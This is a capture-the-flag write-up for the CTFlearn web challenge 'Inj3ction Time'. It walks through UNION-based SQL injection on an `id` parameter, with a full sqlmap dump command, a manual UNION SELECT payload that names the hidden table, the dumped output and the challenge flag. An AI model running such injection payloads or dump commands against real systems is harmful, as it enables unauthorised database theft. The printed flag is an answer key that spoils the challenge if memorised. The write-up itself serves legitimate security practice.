# Inj3ction Time


{{< image src="./images/web.webp" >}}

> **I stumbled upon this website and I think they have the flag in there somewhere. UNION might be a helpful command.**

{{< admonition tldr "TL;DR" >}}
**Inj3ction Time** is a web security challenge demonstrating **UNION-based SQL Injection**. The application queries a database record based on the `id` GET parameter without input validation. Using `sqlmap` or a manual `UNION SELECT` payload extracts the database contents and leaks the secret flag stored in the table.
{{< /admonition >}}

## Initial Analysis

The target application presents an input form asking for an ID:

{{< image src="./images/web.webp" >}}

Submitting a value sends an HTTP GET request with the query parameter `id`:

```http
GET /web8/?id=1 HTTP/1.1
Host: web.ctflearn.com
```

Key characteristics:
1. The user input is accepted directly into the URL query string.
2. The server processes this value dynamically in a backend database query.
3. The prompt explicitly mentions `UNION`, indicating that results are reflected in the HTTP response.

---

## Exploitation

We can automate the identification and database dump using `sqlmap`:

```bash
sqlmap -u "https://web.ctflearn.com/web8/?id=1" \
  --dump \
  --time-sec=10 \
  --threads=1 \
  --no-cast \
  --batch
```

### Key Parameter Breakdown

- `-u`: Specifies the target URL and injectable parameter (`id`).
- `--dump`: Instructs sqlmap to dump the discovered table entries.
- `--no-cast`: Suppresses data-type casting payloads that can cause syntax errors on older MySQL backends.
- `--time-sec=10`: Sets the sleep delay tolerance for blind/time-based verification.

### Manual UNION Injection

Alternatively, we can determine the number of columns using `ORDER BY` and union the hidden data:

```sql
-1 UNION SELECT 1, 2, 3, f0und_m3 FROM web8.w0w_y0u_f0und_m3 -- -
```

The application outputs the secret table row:

```text
+---------------------------------+
| f0und_m3                        |
+---------------------------------+
| abctf{uni0n_1s_4_gr34t_c0mm4nd} |
+---------------------------------+
```

---

## Flag

```text
abctf{uni0n_1s_4_gr34t_c0mm4nd}
```


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/inj3ction-time/  

